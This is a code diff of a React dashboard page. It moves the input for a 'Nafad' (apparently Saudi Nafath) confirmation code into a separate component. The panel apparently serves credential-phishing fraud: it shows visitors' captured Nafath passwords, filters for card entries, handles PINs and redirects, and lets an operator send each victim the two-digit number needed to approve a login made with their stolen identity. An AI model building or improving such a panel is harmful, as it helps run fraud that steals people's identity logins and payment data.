@@ -1,6 +1,7 @@
 import React, { useEffect, useMemo, useState, useRef, useCallback } from "react";
 import { io, Socket } from "socket.io-client";
 import { addData, hasMeaningfulDashboardPayload } from "@/lib/api";
+import NafadInput from "@/components/NafadInput";
 
 type RequestItem = {
   id: string;
@@ -98,12 +99,10 @@ export default function DashboardPage() {
   const [filterMode, setFilterMode] = useState<"all" | "cards">("all");
   const [nowTick, setNowTick] = useState<number>(Date.now());
   const [pinInput, setPinInput] = useState("");
-  const [nafadInput, setNafadInput] = useState("");
   const [actionLoading, setActionLoading] = useState<string | null>(null);
   
-  // Refs for input fields to prevent focus loss on re-render
+  // Ref for PIN input field to prevent focus loss on re-render
   const pinInputRef = useRef<HTMLInputElement>(null);
-  const nafadInputRef = useRef<HTMLInputElement>(null);
   const [localDecisionStates, setLocalDecisionStates] = useState<Record<string, string>>({});
   const [notification, setNotification] = useState<{ type: "success" | "error"; message: string } | null>(null);
   const [redirectPage, setRedirectPage] = useState("");
@@ -1198,15 +1197,16 @@ export default function DashboardPage() {
     }
   };
 
-  const handleSendNafadCode = async () => {
+  const handleSendNafadCode = async (code: string) => {
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
-    if (!visitorId) return;
+    if (!visitorId || !code) return;
+    
     setActionLoading("nafad");
     try {
       const res = await fetch("/api/dashboard/send-nafad-code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ visitorId, nafadCode: nafadInput }),
+        body: JSON.stringify({ visitorId, nafadCode }),
       });
       if (res.ok) {
         showNotification("success", "تم إرسال رمز النفاذ للعميل");
@@ -2195,33 +2195,17 @@ const renderNafadBox = () => {
           </div>
         </div>
 
-        {/* Input field and send button - show ONLY when verifying (new event) */}
+        {/* OTP input - isolated with React.memo to prevent focus loss on re-render */}
         {isVerifying && (
           <div style={{ display: "flex", flexDirection: "column", gap: 12, marginTop: 8 }}>
-            <div style={{ display: "flex", gap: 8 }}>
-              <input
-                ref={nafadInputRef}
-                type="text"
-                placeholder="أدخل رقم التأكيد"
-                defaultValue={nafadInput}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, "").slice(0, 2);
-                  setNafadInput(value);
-                }}
-                style={{ flex: 1, padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "0.875rem" }}
-              />
-              <button
-                onClick={() => {
-                  handleSendNafadCode();
-                  setNafadInput("");
-                  if (nafadInputRef.current) nafadInputRef.current.value = "";
-                }}
-                disabled={actionLoading === "nafad" || !nafadInput}
-                style={{ padding: "10px 16px", background: nafadInput ? "#2563eb" : "#9ca3af", color: nafadInput ? "#ffffff" : "#f3f4f6", borderRadius: 8, fontSize: "0.875rem", fontWeight: 700, cursor: nafadInput ? "pointer" : "not-allowed", border: "none" }}
-              >
-                إرسال
-              </button>
-            </div>
+            <NafadInput
+              variant="compact"
+              placeholder="أدخل رقم التأكيد"
+              isOtp={true}
+              buttonText="إرسال"
+              onSend={handleSendNafadCode}
+              isLoading={actionLoading === "nafad"}
+            />
           </div>
         )}
 
@@ -4118,47 +4102,11 @@ const renderNafadBox = () => {
                   <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.nafadPassword}</span>
                 </div>
               )}
-              {/* حقل إدخال رمز النفاذ - uses ref to prevent focus loss on re-render */}
-              <input
-                ref={nafadInputRef}
-                type="text"
-                placeholder="أدخل رمز النفاذ..."
-                defaultValue={nafadInput}
-                onChange={(e) => {
-                  // Update ref directly for immediate display (prevents focus loss)
-                  const value = e.target.value;
-                  // Update state asynchronously for button disabled logic
-                  setNafadInput(value);
-                }}
-                style={{ 
-                  width: "100%", 
-                  padding: "10px 12px", 
-                  border: "1px solid #d1d5db", 
-                  borderRadius: 8, 
-                  fontSize: "14px",
-                  textAlign: "center",
-                  letterSpacing: "0.2em",
-                  direction: "ltr",
-                  marginBottom: 8
-                }}
+              {/* NafadInput component - isolated with React.memo to prevent focus loss on re-render */}
+              <NafadInput
+                onSend={handleNafadCode}
+                isLoading={actionLoading === "nafad"}
               />
-            {/* زر إرسال رمز النفاذ */}
-            <button 
-              onClick={() => handleNafadCode(nafadInput)}
-              disabled={actionLoading === "nafad" || !nafadInput.trim()}
-              style={{ 
-                width: "100%", 
-                padding: "10px 16px", 
-                border: "none", 
-                borderRadius: 8, 
-                background: nafadInput.trim() ? "#111827" : "#9ca3af", 
-                color: "#ffffff", 
-                fontWeight: 600, 
-                cursor: actionLoading === "nafad" || !nafadInput.trim() ? "wait" : "pointer"
-              }}
-            >
-              📤 {actionLoading === "nafad" ? "جارٍ الإرسال..." : "إرسال رمز النفاذ"}
-            </button>
             </div>
             
             {/* زر عرض السجل */}
